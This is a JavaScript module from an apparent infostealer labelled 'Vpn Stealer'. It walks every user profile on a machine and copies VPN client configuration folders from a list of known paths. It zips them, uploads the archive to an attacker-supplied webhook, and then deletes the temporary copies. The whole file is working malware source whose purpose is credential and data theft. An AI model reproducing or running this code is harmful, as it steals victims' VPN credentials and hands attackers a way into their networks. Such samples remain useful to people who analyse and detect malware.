const fs = require('fs');
const path = require('path');
const os = require('os');

const vpnsPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

module.exports = async (webhookUrl) => {
    const users = await hardware.GetUsers();

    const vpnsTempDir = path.join(os.tmpdir(), 'vpns-temp');
    if (!fs.existsSync(vpnsTempDir)) {
        fs.mkdirSync(vpnsTempDir, { recursive: true });
    }

    let vpnsFound = '';

    for (const user of users) {
        for (const [name, relativePath] of Object.entries(vpnsPaths.GetVpns())) {
            const vpnsPath = path.join(user, relativePath);

            if (!fs.existsSync(vpnsPath) || !fs.lstatSync(vpnsPath).isDirectory()) {
                continue;
            }

            try {
                const vpnsDestPath = path.join(vpnsTempDir, user.split(path.sep)[2], name);
                await fileutil.Copy(vpnsPath, vpnsDestPath);
                vpnsFound += `\n✅ ${user.split(path.sep)[2]} - ${name}`;
            } catch (err) {
                continue;
            }
        }
    }

    if (vpnsFound === '') {
        return;
    }

    if (vpnsFound.length > 4090) {
        vpnsFound = 'Numerous vpns to explore.';
    }

    const vpnsTempZip = path.join(os.tmpdir(), 'vpns.zip');
    try {
        await fileutil.ZipDirectory({
            inputDir: vpnsTempDir,
            outputZip: vpnsTempZip
        });

        await requests.Webhook(webhookUrl, {
            embeds: [{
                title: 'Vpn Stealer',
                description: '```' + vpnsFound + '```',
            }],
        }, [vpnsTempZip]);

        const WishTempDir = fileutil.WishTempDir('vpns');
        await fileutil.Copy(vpnsTempDir, WishTempDir);
        
        [vpnsTempDir, vpnsTempZip].forEach(async dir => {
            await fileutil.RemoveDir(dir);
        });
    } catch (error) {
        console.error(error);
    }
};